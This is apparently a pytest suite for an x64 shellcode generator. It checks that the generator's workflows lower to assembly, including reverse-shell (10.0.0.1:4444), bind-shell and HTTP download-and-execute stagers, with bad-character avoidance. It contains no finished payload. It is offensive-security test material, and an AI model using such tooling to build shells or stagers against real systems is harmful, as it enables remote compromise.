"""Tests for the x64 workflow backend, stack allocation, and IR lowering."""
from __future__ import annotations

import re

import pytest

from emitrion.api_database import API_DATABASE, STRUCT_DATABASE, STRUCT_DATABASE_X64
from emitrion.payload_templates.base import TemplateConfig
from emitrion.schema import Manifest, StringEntry, VariableEntry
from emitrion.stack_alloc_x64 import StackLayoutX64, build_layout_x64
from emitrion.workflow.ir import (
    AllocateStruct,
    Block,
    CallAPI,
    CallBuffer,
    Compare,
    ConstructString,
    Immediate,
    Input,
    NameRef,
    SuccessPredicate,
    Terminate,
    Workflow,
    WriteStructField,
    ZeroStruct,
)
from emitrion.workflow.reference import (
    IRGetUsernameTemplate,
    IRHttpDownloadTemplate,
    IRMoveFileTemplate,
    WorkflowTemplate,
    build_bind_shell_workflow,
    build_get_username_workflow,
    build_http_download_workflow,
    build_move_file_workflow,
    build_reverse_shell_workflow,
    build_run_command_workflow,
)
from emitrion.workflow.x64_backend import lower_workflow_x64


def _x64_config(**kwargs) -> TemplateConfig:
    return TemplateConfig(arch="x64", **kwargs)


def _make_manifest(
    functions: list[str] | None = None,
    variables: list[str] | None = None,
    strings: list[tuple[str, str]] | None = None,
) -> Manifest:
    return Manifest(
        badchars={0x00, 0x0A, 0x0D},
        functions=functions or [],
        strings=[
            StringEntry(label=l, value=v, method="mov", dest="rdi")
            for l, v in (strings or [])
        ],
        variables=[VariableEntry(name=n) for n in (variables or [])],
        template="ir_run_command",
        arch="x64",
    )


def _auto_layout_x64(
    workflow_builder,
    config: TemplateConfig,
    extra_functions: list[str] | None = None,
    extra_variables: list[str] | None = None,
    extra_strings: list[tuple[str, str]] | None = None,
) -> tuple[StackLayoutX64, Workflow]:
    """Build a StackLayoutX64 by probing a workflow for all required slots.

    Mimics what the build pipeline does: probe_slots auto-discovers APIs,
    variables, strings, and structs needed by the workflow.
    """
    from emitrion.api_database import MODULE_LOAD_ORDER
    from emitrion.workflow.reference import WorkflowTemplate

    w = workflow_builder() if callable(workflow_builder) else workflow_builder
    tmpl = WorkflowTemplate(w)
    probed = tmpl.probe_slots(config)

    dll_names = {m.dll for m in MODULE_LOAD_ORDER}
    struct_names = set(STRUCT_DATABASE.keys()) | set(STRUCT_DATABASE_X64.keys())

    functions: list[str] = list(extra_functions or [])
    variables: list[str] = list(extra_variables or [])
    strings: list[tuple[str, str]] = list(extra_strings or [])

    func_set = set(functions)
    var_set = set(variables)
    str_set = {s[0] for s in strings}

    ir_strings = tmpl.probe_strings(config)
    for label, value in ir_strings.items():
        if label not in str_set:
            strings.append((label, value))
            str_set.add(label)

    ir_struct_map = tmpl.probe_structs(config)
    ir_struct_aliases = set(ir_struct_map.keys())
    ir_struct_types = set(ir_struct_map.values())

    for name in probed:
        if name in func_set or name in var_set or name in str_set:
            continue
        if name in struct_names or name in dll_names:
            continue
        if name in ir_struct_aliases or name in ir_struct_types:
            continue
        if name in API_DATABASE:
            functions.append(name)
            func_set.add(name)
        else:
            variables.append(name)
            var_set.add(name)

    all_funcs = list(functions)
    needs_loadlib = any(
        API_DATABASE[f].module != "kernel32.dll"
        for f in all_funcs if f in API_DATABASE
    )
    if needs_loadlib and "LoadLibraryA" not in func_set:
        functions.append("LoadLibraryA")

    m = _make_manifest(
        functions=functions,
        variables=variables,
        strings=strings,
    )
    extra_struct_names = list(ir_struct_types)
    max_args = max(
        (len(op.arguments) for b in w.blocks for op in b.operations if isinstance(op, CallAPI)),
        default=0,
    )
    layout = build_layout_x64(m, extra_structs=extra_struct_names, max_stack_args=max(max_args - 4, 0))
    return layout, w


class TestX64WorkflowProbeSlots:
    def test_probe_run_command_x64(self) -> None:
        w = build_run_command_workflow()
        tmpl = WorkflowTemplate(w)
        config = _x64_config()
        slots = tmpl.probe_slots(config)
        assert "WinExec" in slots
        assert "cmd" in slots

    def test_probe_reverse_shell_x64(self) -> None:
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        config = _x64_config(lhost="10.0.0.1", lport=4444)
        slots = tmpl.probe_slots(config)
        assert "WSAStartup" in slots
        assert "CreateProcessA" in slots
        assert "STARTUPINFOA" in slots


class TestX64Lowering:
    @pytest.fixture
    def run_command_layout(self) -> StackLayoutX64:
        config = _x64_config(command="calc.exe")
        layout, _ = _auto_layout_x64(build_run_command_workflow, config)
        return layout

    @pytest.fixture
    def run_command_asm(self, run_command_layout) -> str:
        w = build_run_command_workflow()
        config = _x64_config(command="calc.exe")
        return lower_workflow_x64(w, run_command_layout, {0x00, 0x0A, 0x0D}, config)

    def test_contains_block_labels(self, run_command_asm) -> None:
        assert "wf_entry:" in run_command_asm
        assert "wf_success:" in run_command_asm
        assert "wf_fail:" in run_command_asm

    def test_uses_x64_registers(self, run_command_asm) -> None:
        assert "rcx" in run_command_asm or "ecx" in run_command_asm

    def test_uses_rsp_addressing(self, run_command_asm) -> None:
        assert "rsp" in run_command_asm

    def test_contains_call(self, run_command_asm) -> None:
        assert "call qword ptr" in run_command_asm

    def test_no_ebp_references(self, run_command_asm) -> None:
        assert "[ebp" not in run_command_asm

    def test_no_push_sequence_for_args(self, run_command_asm) -> None:
        lines = run_command_asm.split("\n")
        for i, line in enumerate(lines):
            if "call qword ptr" in line:
                before = lines[max(0, i - 6):i]
                pushes = [l for l in before if l.strip().startswith("push") and "rcx" not in l]
                assert len(pushes) == 0, f"Found push-based args before call: {pushes}"

    def test_hang_loop(self, run_command_asm) -> None:
        assert re.search(r"wf_hang_\d+:", run_command_asm)
        assert re.search(r"jmp\s+wf_hang_\d+", run_command_asm)

    def test_deterministic(self, run_command_layout) -> None:
        w = build_run_command_workflow()
        config = _x64_config()
        bc = {0x00, 0x0A, 0x0D}
        a = lower_workflow_x64(w, run_command_layout, bc, config)
        b = lower_workflow_x64(w, run_command_layout, bc, config)
        assert a == b


class TestX64CallConvention:
    def test_first_arg_in_rcx(self) -> None:
        w = Workflow(
            name="test_call",
            blocks=(
                Block("entry", (
                    ConstructString("cmd", Input("command")),
                    CallAPI("WinExec", (NameRef("cmd"), Immediate(0x05)),
                            result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["WinExec"],
            variables=["ret"],
            strings=[("cmd", "calc.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=0)
        config = _x64_config(command="calc.exe")
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "rcx" in asm or "ecx" in asm
        assert "call qword ptr" in asm
        lines = asm.split("\n")
        for i, l in enumerate(lines):
            if "call qword ptr" in l:
                before = "\n".join(lines[max(0, i - 15):i])
                if "rcx" in before:
                    return
        pytest.fail("No call with rcx setup found")

    def test_two_arg_uses_rcx_rdx(self) -> None:
        from emitrion.workflow.ir import AddressOf
        w = Workflow(
            name="test_two_arg",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    CallAPI("CreateProcessA", (
                        Immediate(0), NameRef("cmd"), Immediate(0), Immediate(0),
                        Immediate(1), Immediate(0x08000000), Immediate(0),
                        Immediate(0), AddressOf("STARTUPINFOA"),
                        AddressOf("PROCESS_INFORMATION"),
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["CreateProcessA"],
            variables=["ret"],
            strings=[("cmd", "cmd.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=10)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "rcx" in asm or "ecx" in asm
        assert "rdx" in asm or "edx" in asm


class TestX64StructLowering:
    def test_zero_struct(self) -> None:
        w = Workflow(
            name="test_zero",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["CreateProcessA"])
        layout = build_layout_x64(m, max_stack_args=0)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "xor  eax, eax" in asm
        assert "stosq" in asm or "qword ptr" in asm

    def test_write_struct_field(self) -> None:
        w = Workflow(
            name="test_write",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    WriteStructField("si", "dwFlags", Immediate(0x101)),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["CreateProcessA"])
        layout = build_layout_x64(m, max_stack_args=0)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "dwFlags" in asm


class TestX64CompareAndBranch:
    def test_compare_produces_jcc(self) -> None:
        w = Workflow(
            name="test_branch",
            blocks=(
                Block("entry", (
                    ConstructString("cmd", Input("command")),
                    CallAPI("WinExec", (NameRef("cmd"), Immediate(0x05)), result="ret"),
                    Compare("ret", SuccessPredicate.NONZERO, "ok", "fail"),
                )),
                Block("ok", (Terminate(),)),
                Block("fail", (Terminate(),)),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["WinExec"], variables=["ret"], strings=[("cmd", "calc.exe")])
        layout = build_layout_x64(m, max_stack_args=0)
        config = _x64_config(command="calc.exe")
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "test" in asm or "cmp" in asm
        assert "jnz" in asm or "jne" in asm or "jz" in asm or "je" in asm


class TestX64ReverseShellWorkflow:
    def _get_asm(self) -> str:
        config = _x64_config(lhost="10.0.0.1", lport=4444)
        layout, w = _auto_layout_x64(build_reverse_shell_workflow, config)
        return lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)

    def test_reverse_shell_lowers(self) -> None:
        asm = self._get_asm()
        assert "wf_entry:" in asm
        assert "WSAStartup" in asm
        assert "CreateProcessA" in asm
        assert "connect" in asm

    def test_reverse_shell_no_32bit_regs_in_addr(self) -> None:
        asm = self._get_asm()
        assert "[ebp" not in asm
        assert "[esp" not in asm


class TestX64BindShellWorkflow:
    def test_bind_shell_lowers(self) -> None:
        config = _x64_config(lport=4444)
        layout, w = _auto_layout_x64(build_bind_shell_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        assert "bind" in asm
        assert "listen" in asm
        assert "accept" in asm


class TestX64EndToEnd:
    def test_build_x64_run_command(self) -> None:
        import pathlib

        from emitrion.build_x64 import build_x64
        manifest_path = str(
            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "run_command_x64.yaml"
        )
        result = build_x64(manifest_path, assemble=False)
        assert result.asm
        assert "[BITS 64]" in result.asm
        assert "GS:" in result.asm or "gs:" in result.asm
        assert result.contract_md
        assert "x64" in result.contract_md

    def test_build_x64_revshell(self) -> None:
        import pathlib

        from emitrion.build_x64 import build_x64
        manifest_path = str(
            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml"
        )
        result = build_x64(manifest_path, assemble=False)
        assert result.asm
        assert "[BITS 64]" in result.asm
        assert "WSAStartup" in result.asm
        assert "connect" in result.asm
        assert result.debug_runner
        assert "KS_MODE_64" in result.debug_runner

    def test_build_dispatch_routes_x64(self) -> None:
        import pathlib

        from emitrion.build import build
        manifest_path = str(
            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "run_command_x64.yaml"
        )
        result = build(manifest_path, assemble=False)
        assert "[BITS 64]" in result.asm


class TestX64SchemaArch:
    def test_manifest_arch_field(self) -> None:
        m = _make_manifest(functions=["WinExec"])
        assert m.arch == "x64"

    def test_default_arch_is_x86(self) -> None:
        m = Manifest(
            badchars=set(), functions=[], strings=[],
        )
        assert m.arch == "x86"


# ---------------------------------------------------------------------------
# CallBuffer IR node lowering (x64)
# ---------------------------------------------------------------------------


class TestX64CallBufferLowering:
    def test_call_buffer_emits_jmp(self) -> None:
        from emitrion.stack_alloc_x64 import SlotX64, StackLayoutX64
        from emitrion.workflow.x64_backend import _LoweringContextX64

        layout = StackLayoutX64([
            SlotX64(name="virt_buf", offset=0x100, size=8, category="variable"),
        ], frame_size=0x200)
        ctx = _LoweringContextX64(layout, set(), None)
        op = CallBuffer("virt_buf")
        lines = ctx._lower_call_buffer(op)
        asm = "\n".join(lines)
        assert "jmp  rax" in asm
        assert "virt_buf" in asm

    def test_call_buffer_loads_from_rsp(self) -> None:
        from emitrion.stack_alloc_x64 import SlotX64, StackLayoutX64
        from emitrion.workflow.x64_backend import _LoweringContextX64

        layout = StackLayoutX64([
            SlotX64(name="buf", offset=0x90, size=8, category="variable"),
        ], frame_size=0x200)
        ctx = _LoweringContextX64(layout, set(), None)
        op = CallBuffer("buf")
        lines = ctx._lower_call_buffer(op)
        asm = "\n".join(lines)
        assert "rsp" in asm
        assert "jmp  rax" in asm

    def test_call_buffer_is_terminal(self) -> None:
        from emitrion.workflow.x64_backend import _is_terminal

        block = Block("exec", (
            CallBuffer("buf"),
        ))
        assert _is_terminal(block) is True

    def test_call_buffer_in_full_workflow(self) -> None:
        from emitrion.stack_alloc_x64 import SlotX64, StackLayoutX64

        layout = StackLayoutX64([
            SlotX64(name="buf", offset=0x100, size=8, category="variable"),
        ], frame_size=0x200)
        w = Workflow(
            name="stager_test_x64",
            entry="entry",
            blocks=(
                Block("entry", (
                    CallBuffer("buf"),
                )),
            ),
        )
        asm = lower_workflow_x64(w, layout, {0x00})
        assert "jmp  rax" in asm
        assert "wf_entry:" in asm


# ---------------------------------------------------------------------------
# x64 move_file, get_username, http_download workflows
# ---------------------------------------------------------------------------


class TestX64MoveFileWorkflow:
    def test_workflow_is_valid(self) -> None:
        from emitrion.workflow.validator import validate
        w = build_move_file_workflow()
        result = validate(w)
        assert result.valid, result.errors

    def test_probe_slots(self) -> None:
        tmpl = IRMoveFileTemplate()
        config = _x64_config(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
        slots = tmpl.probe_slots(config)
        assert "MoveFileA" in slots

    def test_lowering(self) -> None:
        config = _x64_config(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
        layout, w = _auto_layout_x64(build_move_file_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        assert "MoveFileA" in asm
        assert "wf_entry:" in asm


class TestX64MoveFileEndToEnd:
    def test_build_x64_move_file(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        manifest_path = str(
            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "move_file_x64.yaml"
        )
        result = build_x64(manifest_path, assemble=False)
        assert result.asm
        assert "[BITS 64]" in result.asm
        assert "MoveFileA" in result.asm


class TestX64GetUsernameWorkflow:
    def test_workflow_is_valid(self) -> None:
        from emitrion.workflow.validator import validate
        w = build_get_username_workflow()
        result = validate(w)
        assert result.valid, result.errors

    def test_probe_slots(self) -> None:
        tmpl = IRGetUsernameTemplate()
        config = _x64_config(command="whoami")
        slots = tmpl.probe_slots(config)
        assert "GetUserNameA" in slots
        assert "WinExec" in slots

    def test_lowering(self) -> None:
        config = _x64_config(command="whoami")
        layout, w = _auto_layout_x64(build_get_username_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        assert "GetUserNameA" in asm
        assert "wf_entry:" in asm


class TestX64GetUsernameEndToEnd:
    def test_build_x64_get_username(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        manifest_path = str(
            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "get_username_x64.yaml"
        )
        result = build_x64(manifest_path, assemble=False)
        assert result.asm
        assert "[BITS 64]" in result.asm
        assert "GetUserNameA" in result.asm


class TestX64HttpDownloadWorkflow:
    def test_workflow_is_valid(self) -> None:
        from emitrion.workflow.validator import validate
        w = build_http_download_workflow()
        result = validate(w)
        assert result.valid, result.errors

    def test_probe_slots(self) -> None:
        tmpl = IRHttpDownloadTemplate()
        config = _x64_config(url="http://10.0.0.1/test.exe")
        slots = tmpl.probe_slots(config)
        assert "InternetOpenA" in slots
        assert "InternetOpenUrlA" in slots
        assert "VirtualAlloc" in slots

    def test_lowering(self) -> None:
        config = _x64_config(url="http://10.0.0.1/test.exe")
        layout, w = _auto_layout_x64(build_http_download_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        assert "InternetOpenA" in asm
        assert "InternetReadFile" in asm
        assert "wf_entry:" in asm


class TestX64HttpDownloadEndToEnd:
    def test_build_x64_http_download(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        manifest_path = str(
            pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "http_download_x64.yaml"
        )
        result = build_x64(manifest_path, assemble=False)
        assert result.asm
        assert "[BITS 64]" in result.asm
        assert "InternetOpenA" in result.asm
        assert "wininet.dll" in result.asm
